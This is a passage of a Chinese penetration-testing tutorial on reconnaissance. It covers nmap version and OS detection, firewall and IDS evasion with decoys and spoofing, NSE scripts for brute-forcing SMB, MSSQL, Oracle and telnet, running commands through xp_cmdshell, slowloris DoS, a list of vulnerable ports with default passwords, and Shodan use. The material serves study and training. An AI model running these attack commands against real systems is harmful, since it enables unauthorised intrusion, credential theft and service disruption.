原理\n\n本侦测主要分为以下几个步骤：\n\n\n首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。\n\n如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。\n\n通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。\n\n如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。\n\n如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。\n\n如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。\n\n如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。\n\n##### 用法\n\n比如目标主机把SSH的22号端口改成了2222端口，那么如果使用普通扫描只会发现2222端口是开启的，并不能知道2222号端口上运行的程序，通过加参数  -sV  进行版本扫描，可以探测到目标主机上2222端口运行的是SSH服务\n\n\\-sV: 指定让Nmap进行版本侦测\n\n\\--version-intensity &amp;lt;level&amp;gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。\n\n\\--version-light: 指定使用轻量侦测方式 (intensity 2)\n\n\\--version-all: 尝试使用所有的probes进行侦测 (intensity 9)\n\n\\--version-trace: 显示出详细的版本侦测过程信息\n\n### 7.2.4 OS侦测\n\n##### 原理\n\nNmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。\n\n协议栈指纹识别是一项强大的技术，能够以很高的概率迅速确定操作系统的版本。虽然TCP/IP协议栈的定义已经成为一项标准，但是各个厂家，如微软和RedHat等在编写自己的TCP/IP协议栈时，却做出了不同的解释。这些解释因具有独一无二的特性，故被称为“指纹”。通过这些细微的差别，可以准确定位操作系统的版本\n\n具体实现方式如下：\n\nNmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。\n\n分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。\n\n将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。\n\n##### 用法\n\n\\-O: 指定Nmap进行OS侦测。\n\n\\--osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。\n\n\\--osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统\n例： \n`nmap -O 10.96.10.246`\n\n## 7.3 nmap高级功能\n\n防火墙与IDS规避为用于绕开防火墙与IDS的检测与屏蔽，以便能够更加详细地发现目标主机的状况。nmap提供了多种规避技巧通常可以从两个方面考虑规避方式：数据包的变换(Packet Change)和时序变换(Timing Change)\n\n### 7.3.1 防火墙/IDS规避\n\n* 分片\n将可疑的探测包进行分片处理(例如将TCP包拆分成多个IP包发送过去)，某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查\n* IP诱骗(IP decoys)\n在进行扫描时，将真实IP地址在和其他主机的IP地址混合使用(其他主机需要在线，否则目标主机将回复大量数据包到不存在的数主机，从而实质构成了DOS攻击)，以此让目标主机的防火墙或IDS追踪大量的不同IP地址的数据包，降低其追查到自身的概率。但是，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实的IP地址\n* IP伪装\nIP伪装就是将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机与之通信。需要注意的是，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan 或匿名代理等网络技术\n* 指定源端口\n某些目标主机只允许来自特定端口的数据包通过防火墙。例如，FTP服务器的配置为允许源端口为21号的TCP包通过防火墙与FTP服务器通信，但是源端口为其他的数据包被屏蔽。所以，在此类情况下，可以指定数据包的源端口\n* 扫描延时\n某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率。所以，我们可以降低发包的频率和发包延时以此降低目标主机的审查强度\n* 其他技术\nnmap还提供其他多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的MTU、指定TTL、指定伪装的MAC地址，使用错误检查。\n```\n-f; --mtu &amp;lt;val&amp;gt;: 指定使用分片、指定数据包的 MTU.\n-D &amp;lt;decoy1,decoy2\\[,ME\\],...&amp;gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址。\n-S &amp;lt;IP_Address&amp;gt;: 伪装成其他 IP 地址\n-e &amp;lt;iface&amp;gt;: 使用特定的网络接口\n-g/--source-port &amp;lt;portnum&amp;gt;: 使用指定源端口\n--data-length &amp;lt;num&amp;gt;: 填充随机数据让数据包长度达到 Num。\n--ip-options &amp;lt;options&amp;gt;: 使用指定的 IP 选项来发送数据包。\n--ttl &amp;lt;val&amp;gt;: 设置 time-to-live 时间。\n--spoof-mac &amp;lt;mac address/prefix/vendor name&amp;gt;: 伪装 MAC 地址\n--badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）\n```\n示例：\n```\nnmap -F -Pn -D 10.96.10.100,10.96.10.110,ME -e eth0 -g 5555 202.207.236.3\n```\n\\-F参数表示快速扫描100个端口，-Pn不进行ping扫描，-D表示使用ip诱骗方式掩饰真实ip，使用的是10.96.10.100和10.96.10.110，ME表示自己真实的ip，这里是10.96.10.234，-e 参数指定eth0网卡发送数据包，-g参数指定发送的端口号\n\n### NSE脚本引擎\nNSE脚本引擎(Nmap Scripting Engine)是nmap最强大，最灵活的功能之一，允许用户自己编写脚本来执行自动化的操作或者扩展nmap的功能。\n\nnmap的脚本库的路径：/usr/share/nmap/scripts或/xx/nmap/scripts/ ，该目录下的文件都是nse脚本\n\nNSE使用Lua脚本语言，并且默认提供了丰富的脚本库，目前已经包含了14个类别的350多个脚本。NSE的设计初衷主要考虑以下几个方面:\n* 网络发现（Network Discovery）\n* 更加复杂的版本侦测（例如 skype 软件）\n* 漏洞侦测(Vulnerability Detection)\n* 后门侦测(Backdoor Detection)\n* 漏洞利用(Vulnerability Exploitation)\n##### 分类扫描\n\nNmap的脚本主要分为以下几类：\n* auth: 负责处理鉴权证书（绕开鉴权）的脚本\n* broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务\n* brute: 提供暴力破解方式，针对常见的应用如http/snmp等\n* default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力\n* discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等\n* dos: 用于进行拒绝服务攻击\n* exploit: 利用已知的漏洞入侵系统\n* external: 利用第三方的数据库或资源，例如进行whois解析\n* fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽\n* malware: 探测目标机是否感染了病毒、开启了后门等信息\n* safe: 此类与intrusive相反，属于安全性脚本\n* version: 负责增强服务与版本扫描（Version Detection）功能的脚本\n* vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067\n**示例：**\n```\nnmap --script=auth 192.168.137.\\* 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令\n```\n![](img/18.png)\n```\nnmap --script-brute 192.168.1.1 #nmap可对数据库、SMB、SNMP等进行简单密码的暴力破解\n```\n![](img/19.png)\n```\nnmap --script=default 192.168.137.\\* 或者 nmap -sC 192.168.137.\\*\n```\n默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击\n![](img/20.png)\n```\nnmap --script-vuln 192.168.1.1 #扫描是否有常见漏洞\n```\n![](img/21.png)\n```\nnmap -n -p445 --script=broadcast 192.168.137.4\n```\n在局域网内探查更多服务开启状况\n![](img/22.jpg)\n```\nnmap --script external 202.103.243.110\n```\n利用第三方的数据库或资源，例如进行whois解析\n##### 应用扫描\n\n* vnc扫描\n```\nnmap --script=realvnc-auth-bypass 192.168.137.4\n# 检查vnc认证方式\nnmap --script=vnc-auth  192.168.137.4\n# 获取vnc信息\nnmap --script=vnc-info 192.168.137.4\n```\n* smb扫描\n```\nnmap --script=smb-brute.nse 192.168.137.4\n# smb字典破解\nnmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4\n# smb已知的几个漏洞\nnmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4\n# 查看共享目录\nnmap -p 445 --script smb-ls--script-args ‘share=e\\$,path=\\\\,smbuser=test,smbpass=test’ 192.168.137.4\n#查询主机一些敏感信息（注：需要下载nmap_service）\nnmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test192.168.137.4\n# 查看会话\nnmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=test,smbpass=test192.168.137.4\n# 系统信息\nnmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=test192.168.137.4\n```\n* mssql扫描\n```\n# 破解mssql用户名密码\nnmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd192.168.137.4\n# xp_cmdshell 执行命令\nnmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=\&quot;net user\&quot; 192.168.137.4\n```\n* mysql扫描\n```\n# 扫描root空口令\nnmap –p 3306 --script=mysql-empty-password.nse 192.168.137.4\n# 列出所有mysql用户\nnmap –p 3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4\n# 支持同一应用的所有脚本扫描\nnmap --script=mysql-\\* 192.168.137.4\n```\n* oracle扫描\n```\n# oracle sid扫描\nnmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5\n# oracle弱口令破解\nnmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd192.168.137.5\n```\n* 其它好用的脚本\n```\nnmap --script=broadcast-netbios-master-browser 192.168.137.4 发现网关\nnmap -p 873 --script rsync-brute --script-args &#39;rsync-brute.module=www&#39; 192.168.137.4 破解rsync\nnmap --script informix-brute -p 9088 192.168.137.4 informix数据库破解\nnmap -p 5432 --script pgsql-brute 192.168.137.4 pgsql破解\nnmap -sU --script snmp-brute 192.168.137.4 snmp破解\nnmap -sV --script=telnet-brute 192.168.137.4 telnet破解\nnmap --script=http-vuln-cve2010-0738 --script-args &#39;http-vuln-cve2010-0738.paths={/path1/,/path2/}&#39; &amp;lt;target&amp;gt; jboss autopwn\nnmap --script=http-methods.nse 192.168.137.4 检查http方法\nnmap --script http-slowloris --max-parallelism 400 192.168.137.4 dos攻击，对于处理能力较小的站点还挺好用的 &#39;half-HTTP&#39; connections\nnmap --script=samba-vuln-cve-2012-1182 -p 139 192.168.137.4\n```\n可查看脚本内容，查找脚本所调用的文件，并修改。\n## 常见危险端口对应的服务\n```\n20：FTP服务的数据传输端口\n21：FTP服务的连接端口，可能存在  弱口令暴力破解\n22：SSH服务端口，可能存在 弱口令暴力破解\n23：Telnet端口，可能存在 弱口令暴力破解\n25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应\n43：whois服务端口\n53：DNS服务端口(TCP/UDP 53)\n67/68：DHCP服务端口\n69：TFTP端口，可能存在弱口令\n80：HTTP端口，常见web漏洞\n110：POP3邮件服务端口，和SMTP的25端口对应\n135：RPC服务\n137/138： NMB服务\n139：SMB/CIFS服务\n143：IMAP协议端口\n161/162: Snmp服务，public弱口令\n389：LDAP目录访问协议，有可能存在注入、弱口令\n443：HTTPS端口，心脏滴血等与SSL有关的漏洞\n445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010\n512/513/514：Linux Rexec服务端口，可能存在爆破\n873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞\n1080：socket端口，可能存在爆破\n1099：RMI，可能存在 RMI反序列化漏洞\n1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露\n1433：SQL Server对外提供服务端口\n1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口\n1521：oracle数据库端口\n2049：NFS服务端口，可能存在NFS配置不当\n2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞\n2375：Docker端口，可能存在 Docker未授权访问漏洞\n2601:   Zebra ，默认密码zebr\n3128:   squid ，匿名访问（可能内网漫游）\n3306：MySQL数据库端口，可能存在 弱口令暴力破解\n3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现\n3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞\n4440：Rundeck，弱口令admin\n4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）\n4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)\n4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin\n5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞\n5432：PostGreSQL数据库的端口\n5632：PyAnywhere服务端口，可能存在代码执行漏洞\n5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞\n5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞\n6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞\n7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞\n7180：Cloudera manager端口\n8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞\n8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell\n8080-8090：可能存在web服务\n8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞\n8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）\n9000：fastcgi端口，可能存在远程命令执行漏洞\n9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)\n9043/9090：WebSphere，可能存在WebSphere反序列化漏洞\n9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞\n10000：Webmin-Web控制面板，可能存在弱口令\n10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)\n11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞\n27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞\n50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。\n50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞\n61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现\n60020：hbase.regionserver.port，HRegionServer的RPC端口\n60030：hbase.regionserver.info.port，HRegionServer的http端口\n```\n# 网站敏感目录和文件\n扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏\n* 后台目录：弱口令，万能密码，爆破\n* 安装包：获取数据库信息，甚至是网站源码\n* 上传目录：截断、上传图片马等\n* mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell\n* 安装页面 ：可以二次安装进而绕过\n* phpinfo：会把你配置的各种信息暴露出来\n* 编辑器：fck、ke、等\n* iis短文件利用：条件比较苛刻  windows、apache等\n* 提到了网站敏感目录我们就不得不提 robots.txt 文件了\n* robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。\n假如编写的robots.txt文件内容如下：\n```\nUser-agent: \\*\nDisallow: /data/\nDisallow: /db/\nDisallow: /admin/\nDisallow: /manager/\nAllow:/images/\n```\n其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/  即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。\n\n虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。\n\n探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等\n\n## dirbuster\n\nDirbuster是一种履带式和粗暴式的混合物; 它遵循它找到的页面中的所有链接，但也为可能的文件尝试不同的名称。这些名称可能位于与我们使用的文件类似的文件中，也可能由Dirbuster使用Pure Brute Force选项自动生成，并设置字符集以及生成的单词的最小和最大长度。\n\n为确定文件是否存在，DirBuster使用服务器的响应代码。最常见的响应如下所示：\n\n200 ok：文件存在\n\n404找不到404文件：服务器中不存在该文件\n\n301 301永久移动：这是重定向到给定的URL\n\n401 Unauthorized:访问此文件需要身份验证\n\n403 Forbidden：请求有效但服务器拒绝响应\n\n基本用法：dirb 网站地址\n\n# 旁站和C段扫描\n\n旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！\n\n对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。\n\n旁站和C段在线查询地址：\n* http://www.webscan.cc/\n* https://phpinfo.me/bing.php&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/信息收集.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1.png&quot;],[0,&quot;img/2.png&quot;],[0,&quot;img/3.png&quot;],[0,&quot;img/4.png&quot;],[0,&quot;img/5.png&quot;],[0,&quot;img/6.png&quot;],[0,&quot;img/7.png&quot;],[0,&quot;img/8.png&quot;],[0,&quot;img/9.png&quot;],[0,&quot;img/10.png&quot;],[0,&quot;img/11.png&quot;],[0,&quot;img/12.png&quot;],[0,&quot;img/13.png&quot;],[0,&quot;img/14.png&quot;],[0,&quot;img/16.png&quot;],[0,&quot;img/15.png&quot;],[0,&quot;img/17.png&quot;],[0,&quot;img/18.png&quot;],[0,&quot;img/19.png&quot;],[0,&quot;img/20.png&quot;],[0,&quot;img/21.png&quot;],[0,&quot;img/22.jpg&quot;]]],&quot;digest&quot;:[0,&quot;dd106f0c3d802cc4&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;前言\&quot;&gt;前言&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#前言\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;方式：主动扫描，开放搜索等。&lt;/p&gt;\n&lt;p&gt;开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。&lt;/p&gt;\n&lt;p&gt;基础信息：IP、网段、域名、端口。&lt;/p&gt;\n&lt;p&gt;应用信息：各端口的应用。例如web应用、邮件应用、等等。&lt;/p&gt;\n&lt;p&gt;系统信息：操作系统版本&lt;/p&gt;\n&lt;p&gt;版本信息：所有这些探测到的东西的版本。&lt;/p&gt;\n&lt;p&gt;服务信息：中间件的各类信息，插件信息。&lt;/p&gt;\n&lt;p&gt;人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。&lt;/p&gt;\n&lt;p&gt;防护信息：试着看能否探测到防护设备。&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;逆向pwn ,逆向工程、web、移动&lt;/p&gt;\n&lt;p&gt;主动信息收集：通过直接访问、扫描网站，这种流量将流经网站&lt;/p&gt;\n&lt;p&gt;被动信息收集：利用第三方的服务对目标进行访问了解，比例： Shodan搜索等&lt;/p&gt;\n&lt;p&gt;详见Shodan使用手册。&lt;/p&gt;\n&lt;h1 id=\&quot;在线搜索shodan\&quot;&gt;在线搜索（Shodan）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#在线搜索shodan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Shodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。&lt;/p&gt;\n&lt;p&gt;在windows系统上访问Shodan只需要访问链接：&lt;a href=\&quot;https://www.shodan.io/\&quot;&gt;https://www.shodan.io/&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;shodan工作原理\&quot;&gt;Shodan工作原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#shodan工作原理\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;那么 Shodan 是怎么工作的呢？Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息，通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的 FTP 服务器，或者哪个ip对应的主机是哪种设备。&lt;/p&gt;\n&lt;h2 id=\&quot;shodan的使用\&quot;&gt;Shodan的使用&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#shodan的使用\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;我们在左上角输入我们要搜索的关键字，然后下面就出来搜索结果了。比如我们搜索 SSH\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/2.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n上图的搜索结果包含两个部分，左侧是大量的汇总数据包括：&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Results map – 搜索结果展示地图&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Top services (Ports) – 使用最多的服务/端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Top organizations (ISPs) – 使用最多的组织/ISP&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Top operating systems – 使用最多的操作系统&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Top products (Software name) – 使用最多的产品/软件名称&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;随后，在中间的主页面我们可以看到包含如下的搜索结果：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;IP 地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;主机名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ISP&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;该条目的收录收录时间&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;该主机位于的国家&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Banner 信息&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;想要了解每个条目的具体信息，只需要点击每个条目下方的 details 按钮即可。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/3.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;我们还可以点击 Exploits ，Shodan 就会帮我们查找针对不同平台、不同类型可利用的 exploits。当然也可以通过直接访问网址来自行搜索：&lt;a href=\&quot;https://exploits.shodan.io/welcome%EF%BC%9B\&quot;&gt;https://exploits.shodan.io/welcome；&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/4.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;我们还可以点击Maps，查看设备分布的地图\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/5.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;如果我们想生成报表，我们可以点击Create Report\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/6.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;我们还可以直接点击 Explore ，看网络上其他用户使用最多的搜索\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 